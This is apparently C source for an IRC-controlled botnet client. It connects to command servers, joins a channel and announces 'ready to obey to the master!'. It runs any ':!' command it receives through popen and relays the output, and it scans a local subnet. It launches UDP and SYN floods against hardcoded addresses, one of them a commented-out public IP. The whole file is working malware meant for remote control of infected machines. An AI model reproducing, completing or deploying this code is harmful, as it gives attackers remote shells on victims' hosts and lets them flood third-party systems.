#include "../header/header.h"

int irc_connect(irc_info *info) {

	// verifies if may use pre configured servers or argument passed server
	bool predef_srv = info->hostname;

	char *srv = NULL;
	char *port = NULL;

	char *irc_servers = malloc(strlen(IRC_SERVERS));
	strcpy(irc_servers, IRC_SERVERS);

	char *end_tok;

	int fd_irc;

	// structures used to get host info, like IP e port
	struct addrinfo hints, *result, *rp;

	// hints is used to filter getaddrinfo response
	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_canonname = NULL;
	hints.ai_addr = NULL;
	hints.ai_next = NULL;
	hints.ai_socktype = SOCK_STREAM; // we want TCP
	hints.ai_family = AF_INET; // only IPv4, put AF_INET6 to IPv6 or AF_UNSPEC to get both
	hints.ai_flags = 0;

	for(;;) {

		fd_irc = 0;

		if (!predef_srv) {

			if (srv) {
				srv = strtok_r(NULL, "|", &end_tok);

				srv = strtok(srv, ":");
				port = strtok(NULL, ":");

			} else {
				srv = strtok_r(irc_servers, "|", &end_tok);
				srv = strtok(srv, ":");
				port = strtok(NULL, ":");
			}
			printf("server = %s port = %s\n", srv, port);
			// if there are no more servers to try
			if (!srv || !port) return EXIT_FAILURE;

		} else {

			// if we've already tried this server
			if (srv) return EXIT_FAILURE;

			port = alloca(10);
			srv = info->hostname;
			sprintf(port, "%d", info->port);
		}


		// try to find a socket
		if (getaddrinfo(srv, port, &hints, &result) != 0) {
			perror("getaddrinfo");

			// try next server
			continue;
		}

		// search through responses
		for (rp = result; rp != NULL; rp = rp->ai_next) {
			if ((fd_irc = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol)) == -1) {
				perror("irc socket");

				// if we can't create a socket with some response, no problem try next
				continue;
			}

			// we've successfuly create a socket, now we need to try to connect
			if (connect(fd_irc, rp->ai_addr, rp->ai_addrlen) == -1) {
				perror("irc connect");
				continue; // again no problem if not works
			}
			break;
		}

		// we must use this convenient method to free all results list
		// (since is a linked list cannot be made with a simple free() )
		freeaddrinfo(result);

		// arrived at last result without successful connection
		if (rp == NULL) {
			close(fd_irc);
			perror("cannot connect to irc");
		} else {

			// we are connected
			info->fd_irc = fd_irc;
			break;
		}
	}

	return EXIT_SUCCESS;
}

int irc_login(irc_info *info) {

	info->nick = random_nick();
	char *NICK = malloc(strlen(info->nick) + 6);
	char *JOIN = malloc(strlen(info->ch) + 6);
	char *USER = malloc(2 * strlen(info->nick) + strlen(IRC_USER) + 1);

	sprintf(USER, IRC_USER, info->nick, info->nick);
	snprintf(NICK, strlen(info->nick) + 6, "NICK %s", info->nick);
	snprintf(JOIN, strlen(info->ch) + 6, "JOIN %s", info->ch);

	if (write(info->fd_irc, NICK, strlen(NICK)) == -1) {
		perror("sending nick");
		return EXIT_FAILURE;
	}
	// send newline
	write(info->fd_irc, "\n", 1);
	printf("value of USER = %s\n", USER);
	if (write(info->fd_irc, USER, strlen(USER)) == -1) {
		perror("sending user");
		return EXIT_FAILURE;
	}
	// send newline
	write(info->fd_irc, "\n", 1);

	if (write(info->fd_irc, JOIN, strlen(JOIN)) == -1) {
		perror("sending join");
		return EXIT_FAILURE;
	}
	// send newline
	write(info->fd_irc, "\n", 1);

	free(NICK);
	free(JOIN);

	return EXIT_SUCCESS;
}

int irc_send(char *msg, int len, irc_info *info) {

	char *PRIVMSG = malloc(len + strlen("PRIVMSG") + strlen(info->ch) + 10);
	snprintf(PRIVMSG, len + strlen(info->ch) + 12, "PRIVMSG %s :%s\n", info->ch, msg);

	int num_write;

	if ((num_write = write(info->fd_irc, PRIVMSG, strlen(PRIVMSG))) == -1) {
		perror("write privmsg irc");
		return EXIT_FAILURE;
	}

	free(PRIVMSG);
	return EXIT_SUCCESS;
}

int irc_listen(irc_info *info) {

	int num_read;

	char buf[MAX_BUF], message[MAX_BUF + strlen("Executing command: ") + 30], popen_buf[MAX_BUF + 1];

	char *str_ret;

	// handle command line sent in IRC
	char command[100];

	FILE *file_popen;
	char welcome[] = "ready to obey to the master!";

	irc_send(welcome, strlen(welcome), info);

	while((num_read = read(info->fd_irc, buf, sizeof(buf))) > 0) {

		// set the terminating null byte of string before \r character
		buf[num_read] = '\0';

		if ((str_ret = strstr(buf, "PRIVMSG"))) {

			if ((str_ret = strstr(buf, ":!"))) {
				sprintf(message, "Executing command: %s", (str_ret + 2));

				irc_send(message, strlen(message), info);

				strncpy(command, (str_ret + 2), strlen(str_ret) - 3);

				command[strlen(str_ret) - 4] = '\0';

				if (!(file_popen = popen(command, "r"))) {

					sprintf(message, "ERROR executing command: %s", command);
					irc_send(message, strlen(message), info);
					continue;

				} else {
					while(fgets(popen_buf, sizeof(popen_buf), file_popen) != NULL)  {
						irc_send(popen_buf, strlen(popen_buf), info);
					}
				}

				pclose(file_popen);

			} else if ((str_ret = strstr(buf, ":@scan sub"))) {
				//scan_subnetwork(info);

				scan_subnetwork(info, 192, 168, 0);

				//if (subnet)
				//	irc_send(subnet, strlen(subnet), info);
				//else
				//	irc_send("deu erro", 8, info);
			} else if ((str_ret = strstr(buf, ":@attack udp"))) {

				attack_info ainfo;
				ainfo.n_pkts = 10;
				inet_pton(AF_INET, "172.17.0.2", &(ainfo.d_ip));
				//inet_pton(AF_INET, "172.17.0.51", &(ainfo.s_ip));
				ainfo.s_ip = 0;
				ainfo.spoof_ip = 0;
				ainfo.d_port = 22;
				ainfo.s_port = 0;
				ainfo.np_chg = 5;

				udp_flood(&ainfo, info);

			} else if ((str_ret = strstr(buf, ":@attack tcp"))) {

				attack_info ainfo;
				ainfo.n_pkts = 1;
				inet_pton(AF_INET, "172.17.0.2", &(ainfo.d_ip));
				//inet_pton(AF_INET, "201.54.192.20", &(ainfo.d_ip));
				ainfo.s_ip = 0;
				ainfo.spoof_ip = 0;
				ainfo.d_port = 80;
				ainfo.s_port = 0;
				ainfo.np_chg = 0;

				syn_flood(&ainfo, info);


			} else if ((str_ret = strstr(buf, ":@kill"))) {
				exit(EXIT_SUCCESS);
			}
		} else if ((str_ret = strstr(buf, "PING")) != NULL) {
			send_pong(info);
		}

		#ifdef DEBUG
			puts(buf);
			fflush(stdout);
		#endif
	}

	return EXIT_SUCCESS;
}
// return a random nick to use in IRC channel
char * random_nick() {
	char rnick[] = "abcdefghijklmnopqrstuvwxyz1234567890";
	char *retnick = malloc(IRC_NICK_LEN + 1);
	for (unsigned int i = 0; i < strlen(rnick); i++) {
		rnick[i] = rnick[rand() % strlen(rnick)];
	}

	strncpy(retnick, rnick, IRC_NICK_LEN);
	retnick[0] = 'b';
	retnick[IRC_NICK_LEN] = '\0';
	return retnick;
}
void send_pong(irc_info *info) {
	write(info->fd_irc, "PONG\n", 5);
}
